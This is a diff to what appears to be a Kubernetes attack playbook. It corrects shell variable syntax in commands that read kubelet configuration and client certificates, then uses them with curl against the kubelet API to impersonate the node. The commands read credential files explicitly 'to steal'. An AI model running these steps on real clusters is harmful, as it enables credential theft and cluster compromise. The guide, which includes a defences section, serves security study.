@@ -29,7 +29,7 @@ ls -la /var/run/secrets/kubernetes.io/serviceaccount/
 Check the kubelet configuration:
 
 ```bash
-cat {$NODE_ROOT}/etc/kubernetes/kubelet.conf 
+cat $NODE_ROOT/etc/kubernetes/kubelet.conf 
 ```
 
 This should contain the paths of the kubelet user certificates that we can steal to impersonate the node user:
@@ -45,7 +45,7 @@ users:
 Check the file(s) are accessible:
 
 ```bash
-ls -la {$NODE_ROOT}/var/lib/kubelet/pki/kubelet-client-current.pem
+ls -la $NODE_ROOT/var/lib/kubelet/pki/kubelet-client-current.pem
 ```
 
 ## Exploitation
@@ -65,7 +65,7 @@ curl -sSk -H "Authorization: Bearer $KUBE_TOKEN" \
 The kubelet PKI certificates can be used to authenticate to either the kubelet or the K8s API:
 
 ```bash
- curl -k --cacert {$NODE_ROOT}/etc/kubernetes/pki/ca.crt --key {$NODE_ROOT}/var/lib/kubelet/pki/kubelet-client-current.pem --cert {$NODE_ROOT}/var/lib/kubelet/pki/kubelet-client-current.pem https://${NODE_IP}:10250/pods/ 
+ curl -k --cacert $NODE_ROOT/etc/kubernetes/pki/ca.crt --key $NODE_ROOT/var/lib/kubelet/pki/kubelet-client-current.pem --cert {$NODE_ROOT}/var/lib/kubelet/pki/kubelet-client-current.pem https://${NODE_IP}:10250/pods/ 
 ```
 
 ## Defences
